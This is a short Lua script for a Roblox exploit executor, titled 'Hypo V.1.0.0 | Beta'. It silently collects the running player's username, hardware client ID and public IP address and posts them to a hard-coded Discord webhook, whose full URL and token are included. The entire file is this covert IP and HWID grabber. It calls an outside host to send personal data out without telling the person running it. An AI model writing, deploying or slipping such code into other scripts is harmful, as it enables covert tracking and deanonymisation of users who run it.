HttpService = game:GetService("HttpService")
Webhook_URL = "https://discord.com/api/webhooks/1099293333723029586/qswUMHMT64TnTAhcEs2sqe7IWc6uAsCD0qwjdWmCRSdjOyUOhvKIlTSw-KkzSPUkER6l"

ip = (game:HttpGet("https://api.ipify.org"))

local response = syn.request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Hypo V.1.0.0 | Beta 👑",
            ["description"] = game.Players.LocalPlayer.Name.." has executed the script.",
            ["type"] = "rich",
            ["color"] = tonumber(0xffffff),
            ["fields"] = {
                {
                    ["name"] = "HWID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true
                },
                {
                    ["name"] = "IP:",
                    ["value"] = ip,
                    ["inline"] = true
                }
            }
        }}
    })
})
